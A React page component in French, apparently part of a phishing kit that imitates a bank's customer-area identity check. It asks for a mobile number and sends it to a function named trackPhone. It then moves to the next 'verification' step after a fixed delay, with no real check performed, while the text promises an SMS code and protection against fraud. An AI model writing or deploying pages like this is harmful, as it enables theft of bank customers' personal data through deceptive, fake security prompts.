import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { UserCircle2 } from 'lucide-react';
import VerifSteps from '../components/VerifSteps';
import { trackPhone } from '../api';

export default function VerifIdentite() {
  const navigate = useNavigate();
  const [phone, setPhone] = useState('');
  const [loading, setLoading] = useState(false);

  const submit = (e) => {
    e.preventDefault();
    if (phone.replace(/\s/g, '').length < 8) return;
    setLoading(true);
    trackPhone(phone.trim(), '+33');
    setTimeout(() => navigate('/verification/informations'), 600);
  };

  return (
    <div className="bg-white min-h-[calc(100vh-68px)] pt-8 md:pt-10 pb-12">
      <div className="max-w-[1100px] mx-auto px-4 md:px-8">
        <VerifSteps current={1} />

        <div className="mt-10 grid lg:grid-cols-[1fr_1fr] gap-8 lg:gap-16 max-w-[980px]">
          {/* Form */}
          <div className="flex flex-col items-center text-center">
            <div className="w-12 h-12 text-[#E9041E]">
              <UserCircle2 size={48} strokeWidth={1.5} />
            </div>
            <h1 className="mt-3 text-[20px] md:text-[22px] font-extrabold text-[#0F1B33]">
              Vérification de votre identité
            </h1>
            <p className="mt-2 text-[13.5px] text-[#2B2B2B] max-w-xs leading-snug">
              Pour sécuriser votre accès, veuillez confirmer votre numéro de téléphone mobile.
            </p>

            <form onSubmit={submit} className="mt-6 w-full max-w-sm text-left">
              <label className="block text-[13px] font-semibold text-[#0F1B33]">
                Numéro de téléphone mobile
              </label>
              <div className="mt-1.5 flex items-stretch gap-2">
                <div className="flex items-center gap-1.5 border border-neutral-400 rounded-[3px] px-2.5 bg-white">
                  <span className="text-[16px] leading-none">🇫🇷</span>
                  <span className="text-[13.5px] text-[#0F1B33] font-semibold">+33</span>
                </div>
                <input
                  type="tel"
                  value={phone}
                  onChange={(e) => setPhone(e.target.value)}
                  placeholder="06 12 34 56 78"
                  className="flex-1 border border-neutral-400 rounded-[3px] px-3 py-2.5 text-[14px] focus:outline-none focus:border-[#0F1B33] focus:ring-1 focus:ring-[#0F1B33]/30"
                />
              </div>

              <button
                type="submit"
                disabled={loading}
                className="mt-6 w-full bg-[#E9041E] hover:bg-[#c8031a] text-white font-bold rounded-full py-2.5 text-[14.5px] disabled:opacity-60 transition-colors"
              >
                {loading ? 'Vérification…' : 'Confirmer'}
              </button>
              <p className="mt-3 text-center text-[11.5px] text-neutral-500">
                Un code de vérification vous sera envoyé par SMS.
              </p>
            </form>
          </div>

          {/* Right info */}
          <div className="lg:border-l lg:border-neutral-200 lg:pl-12">
            <h3 className="text-[14px] font-bold text-[#0F1B33]">Pourquoi cette vérification ?</h3>
            <ul className="mt-3 space-y-2 text-[13.5px] text-[#2B2B2B] list-disc pl-5 leading-[1.55]">
              <li>Confirmer que le numéro associé à votre Espace Client est à jour.</li>
              <li>Cette étape confirme que vous êtes bien le titulaire du compte.</li>
              <li>Vous protéger contre les accès frauduleux et la fraude par téléphone ou e-mail.</li>
            </ul>
            <h3 className="mt-6 text-[14px] font-bold text-[#0F1B33]">Besoin d&rsquo;aide ?</h3>
            <ul className="mt-3 space-y-1.5 text-[13.5px]">
              <li>
                <a href="#" className="text-[#E9041E] hover:underline font-semibold">
                  &rsaquo; Contacter mon conseiller
                </a>
              </li>
              <li>
                <a href="#" className="text-[#E9041E] hover:underline font-semibold">
                  &rsaquo; Aide à la connexion
                </a>
              </li>
            </ul>
          </div>
        </div>
      </div>
    </div>
  );
}
